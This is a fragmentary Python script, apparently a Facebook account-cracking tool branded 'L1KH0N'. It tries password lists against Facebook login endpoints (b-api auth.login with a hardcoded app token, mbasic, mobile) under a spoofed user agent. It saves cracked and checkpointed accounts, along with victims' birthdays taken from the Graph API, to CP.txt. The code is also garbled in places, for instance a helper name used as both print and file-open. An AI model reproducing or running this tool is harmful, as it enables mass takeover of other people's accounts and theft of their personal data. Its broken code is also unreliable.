...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#Its_HUMAYUN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			Its_HUMAYUN(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							Its_HUMAYUN('[•] Result CP saved to CP.txt')
							Its_HUMAYUN('\n\tCrack Processing...\n')
							Its_HUMAYUN('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					Its_HUMAYUN('\n01.) Metode b-api ')
					Its_HUMAYUN('02.) Metode mbasic ')
					Its_HUMAYUN('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			Its_HUMAYUN('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			Its_HUMAYUN(' [1] L1KH0N Method 1 ')
			Its_HUMAYUN(' [2] L1KH0N Method 2  [ Pro ]')
			Its_HUMAYUN(' [3] L1KH0N Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = Its_HUMAYUN('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_Its_HUMAYUN("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				Its_HUMAYUN('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = Its_HUMAYUN('login.txt').read()
					cp_ttl = Prof_L1KH0N('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					Its_HUMAYUN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				Its_HUMAYUN('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					token = Its_HUMAYUN('token.txt').read()
					cp_ttl = Prof_Its_HUMAYUN('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].Its_HUMAYUN('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [Its_HUMAYUN] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
